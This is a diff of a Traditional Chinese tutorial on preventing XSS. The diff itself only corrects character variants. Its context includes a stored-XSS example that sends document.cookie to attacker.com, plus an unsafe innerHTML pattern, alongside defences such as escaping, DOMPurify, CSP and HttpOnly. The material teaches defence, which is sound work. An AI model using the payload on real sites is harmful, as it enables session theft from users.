@@ -14,7 +14,7 @@ XSS（Cross-Site Scripting）是最常見的前端安全漏洞之一。這篇文
 
 ### 存儲型 XSS
 
-攻擊者把惡意腳本存到數據庫，其他用户訪問時執行：
+攻擊者把惡意腳本存到數據庫，其他用戶訪問時執行：
 
 ```
 攻擊者提交評論：<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
@@ -26,11 +26,11 @@ XSS（Cross-Site Scripting）是最常見的前端安全漏洞之一。這篇文
 瀏覽器執行 script，把 cookie 發送到攻擊者服務器
 ```
 
-危害最大，因為每個訪問該頁面的用户都受影響。
+危害最大，因為每個訪問該頁面的用戶都受影響。
 
 ### 反射型 XSS
 
-惡意腳本藏在 URL 裏，誘導用户點擊：
+惡意腳本藏在 URL 裏，誘導用戶點擊：
 
 ```
 正常 URL：https://example.com/search?q=前端
@@ -42,7 +42,7 @@ XSS（Cross-Site Scripting）是最常見的前端安全漏洞之一。這篇文
 
 ### DOM 型 XSS
 
-攻擊發生在客户端，不經過服務器：
+攻擊發生在客戶端，不經過服務器：
 
 ```javascript
 // 危險代碼：直接把 URL 參數插入 DOM
@@ -56,7 +56,7 @@ document.getElementById("result").innerHTML = "搜索：" + query;
 
 ### 1. 輸出編碼（最基礎）
 
-永遠不要把用户輸入直接插入 HTML。使用轉義函數：
+永遠不要把用戶輸入直接插入 HTML。使用轉義函數：
 
 ```javascript
 function escapeHTML(str) {
@@ -109,7 +109,7 @@ const clean = DOMPurify.sanitize(dirtyHTML, {
 
 ### 3. CSP（內容安全策略）
 
-HTTP 響應頭裏告訴瀏覽器隻允許加載指定來源的資源：
+HTTP 響應頭裏告訴瀏覽器只允許加載指定來源的資源：
 
 ```
 Content-Security-Policy:
@@ -120,7 +120,7 @@ Content-Security-Policy:
   connect-src 'self' https://api.example.com
 ```
 
-即使 XSS 代碼被注入，由於 CSP 限製，惡意腳本也無法加載和執行。
+即使 XSS 代碼被注入，由於 CSP 限制，惡意腳本也無法加載和執行。
 
 Nginx 配置：
 
@@ -140,7 +140,7 @@ Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
 
 ### 5. 輸入驗證
 
-前端驗證隻是輔助，真正的驗證必須在服務端做。但前端也應該：
+前端驗證只是輔助，真正的驗證必須在服務端做。但前端也應該：
 
 ```javascript
 // 富文本編輯器：限製允許的 HTML 標籤
@@ -193,4 +193,4 @@ function isSafeURL(url) {
 
 ## 小結
 
-XSS 防禦的核心原則：**永遠不信任用户輸入**，輸出時永遠轉義。CSP 和 HttpOnly 是額外的防禦層，出問題時限製損害。
+XSS 防禦的核心原則：**永遠不信任用戶輸入**，輸出時永遠轉義。CSP 和 HttpOnly 是額外的防禦層，出問題時限制損害。
